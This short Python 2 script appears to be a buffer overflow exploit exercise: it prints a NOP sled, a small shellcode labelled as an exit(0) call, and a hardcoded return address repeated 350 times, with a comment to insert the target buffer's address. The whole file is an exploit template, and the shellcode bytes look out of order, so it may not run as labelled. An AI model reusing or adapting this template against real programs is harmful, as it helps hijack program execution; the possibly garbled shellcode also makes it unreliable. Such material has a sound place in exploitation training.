

nop = "\x90"
exit_zero = "\xc0\x31\x24\x04\x89\x80\xcd\x90"

# insert here the address of the buffer to be overflowed
buf_addr = "\xd8\xfe\xff\xbf"

code = exit_zero

print 80*nop + code + buf_addr*350
